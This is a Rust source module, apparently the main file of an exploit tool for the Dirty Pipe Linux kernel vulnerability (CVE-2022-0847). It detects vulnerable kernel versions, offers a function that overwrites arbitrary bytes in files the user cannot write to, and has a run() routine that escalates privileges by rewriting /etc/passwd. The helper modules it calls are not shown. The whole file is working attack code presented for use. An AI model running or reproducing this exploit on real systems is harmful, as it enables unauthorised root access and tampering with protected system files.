//! CVE-2022-0847: Dirty Pipe
//! 
//! Arbitrary file overwrite via uninitialized pipe_buffer flags.
//! Target: Linux 5.8 - 5.16.11 (and some 5.15.x before patch)
//!
//! This exploit is 100% reliable with no race conditions.

mod pipe;
mod splice;
mod overwrite;

use log::{info, error};

pub struct Exploit {
    kernel: (u32, u32, u32),
}

impl Exploit {
    pub fn new() -> Self {
        Self { kernel: Self::get_kernel_version() }
    }

    fn get_kernel_version() -> (u32, u32, u32) {
        let mut u: libc::utsname = unsafe { std::mem::zeroed() };
        unsafe { libc::uname(&mut u) };
        
        let r = unsafe { std::ffi::CStr::from_ptr(u.release.as_ptr()) }
            .to_str().unwrap_or("0.0.0");
        
        let p: Vec<u32> = r.split(|c: char| !c.is_ascii_digit())
            .take(3)
            .filter_map(|s| s.parse().ok())
            .collect();
        
        (p.get(0).copied().unwrap_or(0),
         p.get(1).copied().unwrap_or(0),
         p.get(2).copied().unwrap_or(0))
    }

    fn is_vulnerable(&self) -> bool {
        let (maj, min, patch) = self.kernel;
        // Only kernel 5.x is vulnerable
        if maj != 5 { return false; }
        // Need 5.8+
        if min < 8 { return false; }
        // 5.17+ is NOT vulnerable (bug was fixed)
        if min > 16 { return false; }
        // Check patched versions
        if min == 16 && patch >= 11 { return false; }
        if min == 15 && patch >= 25 { return false; }
        if min == 10 && patch >= 102 { return false; }
        true
    }

    /// Overwrite arbitrary file content
    pub fn overwrite_file(&self, target: &str, offset: u64, data: &[u8]) -> Result<(), String> {
        info!("[DirtyPipe] Kernel {}.{}.{}", self.kernel.0, self.kernel.1, self.kernel.2);

        if !self.is_vulnerable() {
            return Err(format!("Not vulnerable (need 5.8-5.16.10, have {}.{}.{})", 
                self.kernel.0, self.kernel.1, self.kernel.2));
        }

        if offset == 0 {
            return Err("Offset must be > 0 (splice limitation)".into());
        }

        // Validate page boundary
        let page_offset = offset & 0xFFF;
        if page_offset as usize + data.len() > 4096 {
            return Err(format!("Data crosses page boundary"));
        }

        overwrite::execute(target, offset, data)
    }

    /// Run full escalation using smart /etc/passwd scanning
    pub fn run(&self) -> Result<(), String> {
        info!("[DirtyPipe] Kernel {}.{}.{}", self.kernel.0, self.kernel.1, self.kernel.2);
        
        if !self.is_vulnerable() {
            return Err(format!("Not vulnerable"));
        }

        // Use smart escalation that scans for suitable targets
        overwrite::escalate_passwd()
    }
}
